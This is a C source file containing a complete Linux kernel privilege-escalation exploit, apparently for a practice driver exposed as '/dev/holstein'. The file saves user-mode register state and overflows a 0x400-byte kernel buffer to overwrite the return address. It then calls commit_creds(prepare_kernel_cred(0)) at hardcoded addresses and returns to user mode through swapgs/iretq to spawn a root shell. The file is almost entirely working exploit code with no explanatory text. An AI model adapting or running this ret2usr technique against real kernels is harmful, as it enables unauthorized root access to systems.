#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define INFO(fmt, ...) fprintf(stderr, "[*] " fmt "\n", ##__VA_ARGS__)
#define WARN(fmt, ...) fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__)
#define ERROR(msg) perror("[-] " msg)

// for saved states
uint64_t iter, user_cs, user_ss, user_rflags, user_rsp;

static void win()
{
    char* argv[] = { "/bin/sh", NULL };
    char* envp[] = { NULL };
    puts("[+] win!");
    execve("/bin/sh", argv, envp);
}

// void save_state()
// {
//     __asm__(
//         ".intel_syntax noprefix;"
//         "mov %0, cs;"
//         "mov %1, ss;"
//         "mov %2, rsp;"
//         "pushf;"
//         "pop %3;"
//         ".att_syntax prefix;"
//         : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags));

//     INFO("Saved state");
// }

void save_state()
{
    asm volatile(
        "movq %%cs, %0;"
        "movq %%ss, %1;"
        "movq %%rsp, %2;"
        "pushfq;"
        "popq %3;"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :
        : "memory");

    INFO("Saved state");
}

// static void restore_state()
// {
//     asm volatile(
//         ".intel_syntax noprefix;"
//         "swapgs;"
//         "mov qword ptr [rsp + 0x20], %0;"
//         "mov qword ptr [rsp + 0x18], %1;"
//         "mov qword ptr [rsp + 0x10], %2;"
//         "mov qword ptr [rsp + 0x08], %3;"
//         "mov qword ptr [rsp + 0x00], %4;"
//         "iretq;"
//         ".att_syntax prefix;"
//         :
//         : "r"(user_ss),
//         "r"(user_rsp),
//         "r"(user_rflags),
//         "r"(user_cs),
//         "r"(win));
// }

static void restore_state()
{
    asm volatile("swapgs ;"
                 "movq %0, 0x20(%%rsp)\t\n"
                 "movq %1, 0x18(%%rsp)\t\n"
                 "movq %2, 0x10(%%rsp)\t\n"
                 "movq %3, 0x08(%%rsp)\t\n"
                 "movq %4, 0x00(%%rsp)\t\n"
                 "iretq"
                 :
                 : "r"(user_ss),
                 "r"(user_rsp),
                 "r"(user_rflags),
                 "r"(user_cs), "r"(win));
}

uint64_t prepare_kernel_cred = 0xffffffff8106e240;
uint64_t commit_creds = 0xffffffff8106e390;

static void escalate_privilege()
{
    char* (*pkc)(int) = (void*)(prepare_kernel_cred);
    void (*cc)(char*) = (void*)(commit_creds);

    (*cc)((*pkc)(0));
    restore_state();
}

int main()
{

    save_state();

    int fd = open("/dev/holstein", O_RDWR);
    if (fd == -1) {
        ERROR("open(\"/dev/holstein\")");
        exit(1);
    }

    const int BUF_SIZE = 0x410;

    char buf[BUF_SIZE] = {};
    memset(buf, 'a', 0x408);
    *(unsigned long*)&buf[0x408] = (unsigned long)&escalate_privilege;
    write(fd, buf, BUF_SIZE);

    close(fd);
    return 0;
}
